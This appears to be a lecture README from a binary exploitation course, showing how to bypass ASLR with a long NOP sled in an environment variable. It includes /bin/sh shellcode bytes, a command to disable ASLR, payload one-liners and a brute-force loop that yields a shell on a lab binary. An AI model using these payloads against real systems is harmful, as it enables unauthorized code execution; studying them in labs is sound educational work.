# Shellcode injection with ASLR

In the previous [Lecture](../Lecture2/README.md) I talked about, injection of
shell code when the ASLR was disabled. ASLR allows adds randomization of
different segment address. So its not very trivial to identify the buffer address. The address of buffer keep on changing with every run of the program. So when the return address points to the buffer address (that keeps on changing), putting the executable shell code in memory is not so easy.  

To disable ALSR,  
`echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`  
To enable the same,  
`echo "2" | sudo dd of=/proc/sys/kernel/randomize_va_space`  

#### Scenario 1: With `nop - \x90` sled.
Suppose I appended few `nop` (no operation instruction) before the shellcode.

#### NOP
> In computer science, a NOP, no-op, or NOOP (pronounced "no op"; short for no operation) is an assembly language instruction, programming language statement, or computer protocol command that does nothing.  

Lets say I added 20 `nop` before the shellcode.
`python -c 'import struct;shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; bufferlen=108; print "\x90"*20+shellcode+"\x90"*(bufferlen-len(shellcode)-20)+"BBBB"+struct.pack("<I", starting address of the buffer)'`
And make return address point to any of the **21** locations, from the staerting address of the buffer to the starting address of the shellcode ( address of buffer + 20), then I will spawn the shell indeed. But **what is the probability?** That return address(which is nothing but buffer address) will end up in any of those locations. The higher the probability, higher are the chances for exploitation.  

The starting address of buffer would be `0xff_ _ _ _ _ _ _` in which the first `0xff` is fixed, because the buffer will lie in the upper portion of memory.  
To test this, create a simple C program:
```C
int main()
{
    int a;
    printf("%p\n", &a);
    return 0;
}
```  
Compile and run this program for say 10 runs.
```bash
$ for i in {1..10};do ./a.out;done
0xffe918bc
0xffdc367c
0xffeaf37c
0xffc31ddc
0xffc6a56c
0xffbcf9bc
0xffbcf02c
0xffbf1dcc
0xfffe386c
0xff9547cc
```
The observation is same what we have assumed. You can test the programs for more trials in case you are not convinced.
It seems that every time the variable is loaded at different addresses in the stack. The address can be represented as 0xffXXXXXc(where X is any hexadecimal digit). With some more testing, it can be seen that even the last half-byte(‘c’ over here) depends on the relative location of the variable inside the program. So in general, the address of a variable on the stack is 0xffXXXXXX. This amounts to 16^6 = 16777216 possible cases. It can be easily seen that the earlier method, mentioned above to exploit the stack, will now work with only 21/16777216 probability(21 is the length of NOP sled, if any of those NOP bytes happens to be where the modified return address is, the shellcode will be executed).  
That means on an average, 1 in ~ 40K runs, the shellcode will be executed. This is way less. In any way we got he hint that somehow we need to increase the length of the `nop` sled on the buffer, but the buffer length is limited. Increasing the size of `nop` will increase the chances of shellcode to run. But How?  

Why not take the help of **environment varibale**?

#### Scenario 2: Putting long shellcode in env varibale
In my vagrant system, I can make the environment variable way long the size of the buffer. My system allows the environment variable to be of length 100K. The reason we are picking environment variable is that, they are itself loaded just above the stack.
Lets create environment variable, say `SHELLCODE`.  
`export SHELLCODE=$(python -c 'print "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
`
And instead of putting the return address to starting address of the buffer, I will put the return address to any of the randomly picked higher memory address. Lets say any address in between highest address `0xffffffff` and `0xff9547cc`. I am picking `0xff882222`.

`$ for i in {1..100}; do ./exploit_me_3 $(python -c 'import struct;print "A"*112 + struct.pack("<I", 0xff882222)'); done`

```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
$whoami
vagrant
```

After few attempts we got the shell. :cool: isn't it !! 


